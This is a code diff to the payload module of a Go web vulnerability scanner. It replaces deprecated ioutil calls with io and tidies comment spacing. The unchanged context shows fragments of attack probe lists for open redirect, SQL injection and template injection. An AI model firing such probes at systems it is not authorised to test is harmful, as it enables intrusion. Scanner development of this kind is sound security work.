@@ -3,7 +3,7 @@ package scanning
 import (
 	"bufio"
 	"encoding/json"
-	"io/ioutil"
+	"io"
 	"net/http"
 	"strings"
 )
@@ -56,7 +56,7 @@ func GetInJsBreakScriptPayload() ([]string, int) {
 	return lst, len(lst)
 }
 
-//basic open redirect payloads
+// basic open redirect payloads
 func getOpenRedirectPayload() []string {
 	payload := []string{
 		"//google.com",
@@ -128,7 +128,7 @@ func getESIIPayload() []string {
 	return payload
 }
 
-//basic sql injection payloads
+// basic sql injection payloads
 func getSQLIPayload() []string {
 	payload := []string{
 		"'",
@@ -179,7 +179,7 @@ func getSQLIPayload() []string {
 	return payload
 }
 
-//getSSTIPayload is return SSTI Payloads
+// getSSTIPayload is return SSTI Payloads
 func getSSTIPayload() []string {
 	payload := []string{
 		"{444*6664}",
@@ -217,7 +217,7 @@ func getAssetHahwul(apiEndpoint, dataEndpoint string) ([]string, string, string)
 	}
 	defer apiResp.Body.Close()
 	var asset Asset
-	infoJSON, err := ioutil.ReadAll(apiResp.Body)
+	infoJSON, err := io.ReadAll(apiResp.Body)
 	json.Unmarshal(infoJSON, &asset)
 
 	// Get Payload Data
@@ -227,7 +227,7 @@ func getAssetHahwul(apiEndpoint, dataEndpoint string) ([]string, string, string)
 		return t, "", ""
 	}
 	defer dataResp.Body.Close()
-	payloadData, err := ioutil.ReadAll(dataResp.Body)
+	payloadData, err := io.ReadAll(dataResp.Body)
 	//payload := strings.Split(string(payloadData), `\n`)
 	payload := splitLines(string(payloadData))
 
